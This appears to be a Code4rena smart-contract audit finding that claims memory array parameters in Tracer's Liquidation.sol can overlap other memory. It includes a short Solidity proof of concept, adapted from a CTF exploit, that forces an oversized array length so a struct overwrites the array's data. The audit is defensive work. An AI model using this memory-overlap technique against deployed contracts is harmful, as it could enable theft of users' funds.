# Handle  JMukesh   # Vulnerability details  ## Impact These array memory parameter can be  problematic if not used properly , if the array is very large it may overlap over other part of memory.  ## Proof of Concept  https://github.com/code-423n4/2021-06-tracer/blob/74e720ee100fd027c592ea44f272231ad4dfa2ab/src/contracts/Liquidation.sol#L274  This an example to show the exploit: // based on https://github.com/paradigm-operations/paradigm-ctf-2021/blob/master/swap/private/Exploit.sol pragma solidity ^0.4.24; // only works with low solidity version  contract test{ struct Overlap { uint field0; } event log(uint);  function mint(uint[] memory amounts) public returns (uint) {  // this can be in any solidity version Overlap memory v; v.field0 = 1234; emit log(amounts[0]); // would expect to be 0 however is 1234 return 1; }  function go() public { // this part requires the low solidity version uint x=0x800000000000000000000000000000000000000000000000000000000000000; // 2^251 bytes memory payload = abi.encodeWithSelector(this.mint.selector, 0x20, x); bool success=address(this).call(payload); } } ## Tools Used  manual review  ## Recommended Mitigation Steps  check array length before using it
